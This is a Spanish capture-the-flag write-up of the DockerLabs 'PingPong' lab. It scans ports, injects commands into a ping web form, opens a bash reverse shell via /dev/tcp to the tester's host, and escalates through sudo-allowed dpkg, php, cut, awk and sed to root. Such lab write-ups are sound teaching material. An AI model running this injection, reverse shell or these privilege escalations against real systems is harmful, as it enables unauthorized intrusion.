#MAQUINA #DOCKERLABS #MEDIO
#RCE
<hr>

# RECONOCIMIENTO

Vamos a resolver **PingPong** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 10:59 CET
Initiating ARP Ping Scan at 10:59
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 10:59, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:59
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 443/tcp on 172.17.0.2
Discovered open port 5000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 10:59, 0.48s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-17 10:59:18 CET for 0s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 64
443/tcp  open  https   syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)



```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene los puertos **80(HTTP)**, **443(HTTPS)** , **5000** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80,443,5000 172.17.0.2                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 11:00 CET
Nmap scan report for hackzones.hl (172.17.0.2)
Host is up (0.000015s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
443/tcp  open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=example.com/organizationName=Your Organization/stateOrProvinceName=California/countryName=US
| Not valid before: 2024-05-19T14:20:49
|_Not valid after:  2025-05-19T14:20:49
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.12.3
|     Date: Mon, 17 Feb 2025 10:00:13 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1747
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Ping Test</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     background-color: #2c3e50;
|     color: #ecf0f1;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     margin: 0;
|     .container {
|     background-color: #34495e;
|     padding: 20px;
|     border-radius: 10px;
|     box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
|     width: 400px;
|     text-align: center;
|     input[type
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=2/17%Time=67B308AD%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,782,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\
SF:x20Python/3\.12\.3\r\nDate:\x20Mon,\x2017\x20Feb\x202025\x2010:00:13\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x201747\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20la
SF:ng=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x
SF:20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x
SF:20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Ping\x20Test</title>\n\
SF:x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20Arial,\x20s
SF:ans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-
SF:color:\x20#2c3e50;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20col
SF:or:\x20#ecf0f1;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20displa
SF:y:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-co
SF:ntent:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20alig
SF:n-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20he
SF:ight:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin
SF::\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:background-color:\x20#34495e;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20padding:\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20box-shadow:\x200\x200\x2010px\x20rgba\(0,\x200,\x200,\x200\.5\);\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20400px;\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20input\[
SF:type")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x
SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=
SF:\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</t
SF:itle>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Message:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x
SF:20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x
SF:20\x20\x20</body>\n</html>\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.43 seconds





```

```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 11:02 CET
Nmap scan report for hackzones.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
5000/tcp open  upnp
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds

whatweb "http://172.17.0.2/"
http://172.17.0.2/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[Apache2 Ubuntu Default Page: It works]

whatweb "http://172.17.0.2:443/"
http://172.17.0.2:443/ [400 Bad Request] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[400 Bad Request]

whatweb "http://172.17.0.2:5000/"
http://172.17.0.2:5000/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.12.3], IP[172.17.0.2], Python[3.12.3], Title[Ping Test], Werkzeug[3.0.1]


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Usando **gobuster** y **wfuzz** no vemos nada interesante.

## HTTP (5000)

Al entrar vemos un botón y una entrada de texto para hacer un ping.

Si ponemos algo valido -> 172.17.0.1 :

```bash
# Ping Test

PING 172.17.0.1 (172.17.0.1) 56(84) bytes of data.
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.021 ms
64 bytes from 172.17.0.1: icmp_seq=2 ttl=64 time=0.034 ms
64 bytes from 172.17.0.1: icmp_seq=3 ttl=64 time=0.030 ms
64 bytes from 172.17.0.1: icmp_seq=4 ttl=64 time=0.029 ms

--- 172.17.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3053ms
rtt min/avg/max/mdev = 0.021/0.028/0.034/0.004 ms

```

Si ponemos algo NO valido -> hola :

```bash
# Ping Test

Command 'ping -c 4 hola' returned non-zero exit status 2.

```

# EXPLOTACION

Intentamos colar un doble comando usando **;**

```bash
172.17.0.1 ;whoami
```

Efectivamente, nos devuelve freddy.

Nos ponemos en escucha por el puerto 443 y nos damos una reverse shell:

```bash
172.17.0.1;/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'
```

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
freddy@061875d85d75:~$ sudo -l
Matching Defaults entries for freddy on 061875d85d75:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User freddy may run the following commands on 061875d85d75:
    (bobby) NOPASSWD: /usr/bin/dpkg


```

Vemos **dpkg** con permisos SUDO  :

   ```bash
   sudo -u bobby dpkg -l
   !/bin/sh
```

YA ESTAMOS COMO BOBBY.

Vemos si el usuario tiene permisos SUDO:
   ```bash
bobby@061875d85d75:/home/freddy$ sudo -l
Matching Defaults entries for bobby on 061875d85d75:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User bobby may run the following commands on 061875d85d75:
    (gladys) NOPASSWD: /usr/bin/php

```

Vemos **php** con permisos SUDO  :

   ```bash
   
bobby@061875d85d75:/home/freddy$ sudo -u gladys php -r "system('/bin/sh');"

```

YA ESTAMOS COMO GLADYS.

Vemos si el usuario tiene permisos SUDO:
   ```bash
gladys@2a0b1be0bb8e:/home/freddy$ sudo -l
Matching Defaults entries for gladys on 2a0b1be0bb8e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User gladys may run the following commands on 2a0b1be0bb8e:
    (chocolatito) NOPASSWD: /usr/bin/cut

```

Vemos **cut** con permisos SUDO  :

   ```bash
   
gladys@2a0b1be0bb8e:/$ find / -user chocolatito 2>/dev/null
/home/chocolatito
/opt/chocolatitocontraseña.txt
gladys@2a0b1be0bb8e:/$ sudo -u chocolatito cut -d "" -f1  /opt/chocolatitocontraseña.txt 
chocolatitopassword


```

YA ESTAMOS COMO CHOCOLATITO.

Vemos si el usuario tiene permisos SUDO:
   ```bash
chocolatito@2a0b1be0bb8e:/home$ sudo -l
Matching Defaults entries for chocolatito on 2a0b1be0bb8e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User chocolatito may run the following commands on 2a0b1be0bb8e:
    (theboss) NOPASSWD: /usr/bin/awk
    
```

Vemos **awk** con permisos SUDO  :

   ```bash
   
chocolatito@2a0b1be0bb8e:/home$ 

    sudo -u theboss awk 'BEGIN {system("/bin/sh")}'



```

YA ESTAMOS COMO THEBOSS.

Vemos si el usuario tiene permisos SUDO:
   ```bash
$ sudo -l
Matching Defaults entries for theboss on 2a0b1be0bb8e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User theboss may run the following commands on 2a0b1be0bb8e:
    (root) NOPASSWD: /usr/bin/sed



```

Vemos **sed** con permisos SUDO  :

   ```bash
   
theboss@2a0b1be0bb8e:~$ sudo sed -n '1e exec sh 1>&0' /etc/passwd
# whoami
root
# 

```

**YA ESTAMOS COMO ROOT.**